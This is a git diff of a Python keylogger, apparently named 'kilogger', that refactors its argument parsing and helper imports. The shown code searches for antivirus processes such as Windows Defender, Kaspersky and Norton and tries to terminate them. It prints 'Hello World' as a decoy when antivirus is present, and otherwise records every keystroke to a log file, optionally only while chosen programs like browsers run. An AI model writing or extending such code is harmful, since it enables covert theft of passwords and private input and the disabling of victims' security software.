@@ -1,3 +1,10 @@
+"""
+TODO [ ]: stop logging when target is closed
+TODO [ ]: Work on logging format
+    what should be the output? (ex. date - running targets - input)
+    can the output be buffered?
+TODO [ ]: Implement capture copy to clipboard functionality
+"""
 import sys
 import time
 import socket
@@ -6,31 +13,12 @@ import logging
 from threading import Thread, Event
 
 
-def install_package(package):
-    """runs pip install 'package'"""
-    import subprocess
-    subprocess.check_call([sys.executable, "-m", "pip", "install", package])
-
-
-def verify_package_installation(package):
-    """tries to import the package"""
-    try:
-        __import__(package)
-        return True
-    except ImportError:
-        return False
-
-
-def coroutine(func):
-    """Basic Coroutine Decorator"""
-
-    def start(*args, **kwargs):
-        cr = func(*args, **kwargs)
-        next(cr)
-        return cr
-
-    return start
-
+from kilogger import (
+    LOGLOC,
+    coroutine,
+    install_package,
+    verify_package_installation
+)
 
 try:
     import psutil
@@ -41,48 +29,13 @@ except ImportError:
     else:
         import psutil
 
-# --- Setup argparse
-PARSER = argparse.ArgumentParser()
 
-PARSER.add_argument(
-    '--force',
-    type=int, choices=[0, 1],
-    default=None,
-    help='0: do not force logger if AV is on. 1: fuck it'
-)
+class StringToList(argparse.Action):
+    """Convert comma-separated string to list"""
 
-PARSER.add_argument(
-    '--targets',
-    type=str,
-    default=[],
-    help=
-    'Name of target processes (ex. "chrome.exe, firefox.exe"); '
-    'note: process names should be separated by ", ".'
-)
-
-
-def friendly_check():
-    # some 'friends' that must be checked
-    target_friends = ['msmpeng.exe', 'avgnt.exe', 'avp.exe',
-                      'avg.exe', 'bitdefender.exe', 'comodo.exe',
-                      'eset.exe', 'f-secure.exe', 'kaspersky.exe',
-                      'norton.exe', 'panda.exe', 'sophos.exe',
-                      'symantec.exe', 'trendmicro.exe', 'windefender.exe'
-                      ]
-
-    target_found = False
-    target_killed = False
-    for proc in psutil.process_iter(['name']):
-        if proc.name().lower() in target_friends:
-            target_found = True
-            try:
-                # terminate always founds a friend but is
-                # never able to say goodbye to him :(
-                proc.terminate()
-                target_killed = True
-            except psutil.AccessDenied:
-                target_killed = False
-    return target_killed or target_found
+    def __call__(self, parser, namespace, values, option_string=None):
+        values = list(map(lambda val: val.strip(), values.split(', ')))
+        setattr(namespace, self.dest, values)
 
 
 class ProcessListener(Thread):
@@ -163,15 +116,55 @@ class ListenerSocket:
                 conn.close()
 
 
+def friendly_check():
+    """
+    TODO: improve or remove
+    """
+    # some 'friends' that must be checked
+    target_friends = ['msmpeng.exe', 'avgnt.exe', 'avp.exe',
+                      'avg.exe', 'bitdefender.exe', 'comodo.exe',
+                      'eset.exe', 'f-secure.exe', 'kaspersky.exe',
+                      'norton.exe', 'panda.exe', 'sophos.exe',
+                      'symantec.exe', 'trendmicro.exe', 'windefender.exe'
+                      ]
+
+    target_found = False
+    target_killed = False
+    for proc in psutil.process_iter(['name']):
+        if proc.name().lower() in target_friends:
+            target_found = True
+            try:
+                # terminate always founds a friend but is
+                # never able to say goodbye to him :(
+                proc.terminate()
+                target_killed = True
+            except psutil.AccessDenied:
+                target_killed = False
+    return target_killed or target_found
+
+
 if __name__ == "__main__":
+    # --- Setup argparse
+    PARSER = argparse.ArgumentParser()
+
+    PARSER.add_argument(
+        '--force',
+        type=int, choices=[0, 1],
+        default=None,
+        help='0: do not force logger if AV is on. 1: fuck it'
+    )
+
+    PARSER.add_argument(
+        '--targets',
+        action=StringToList,
+        default=[],
+        help=
+        'Name of target processes (ex. "chrome.exe, firefox.exe"); '
+        'note: process names should be separated by ", ".'
+    )
+
     args = PARSER.parse_args()
-
-    proc_targets = []
-    if args.targets:
-        proc_targets = args.targets.split(', ')
-
-    # big brain time
-    if (not (args.force and args.force == 1)) and friendly_check():
+    if (not (args.force and args.force == 1)) and friendly_check():  # big brain time
         print('Hello World')
     else:
         try:
@@ -183,18 +176,19 @@ if __name__ == "__main__":
             else:
                 from pynput.keyboard import Listener
 
-        logging.basicConfig(filename='../log.txt', level=logging.DEBUG)
+        logging.basicConfig(filename=LOGLOC, level=logging.DEBUG)
 
         def on_click(key):
             logging.info(str(key))
-
 
         def start_log():
             with Listener(on_press=on_click) as keyboard_listener:
                 keyboard_listener.join()
 
-        if proc_targets:
-            proc_listener = ProcessListener(proc_targets, callback=start_log)
+
+        # --- Run logger
+        if args.targets:
+            proc_listener = ProcessListener(args.targets, callback=start_log)
             proc_listener.start()
             proc_handler = ListenerSocket(proc_listener)
         else:
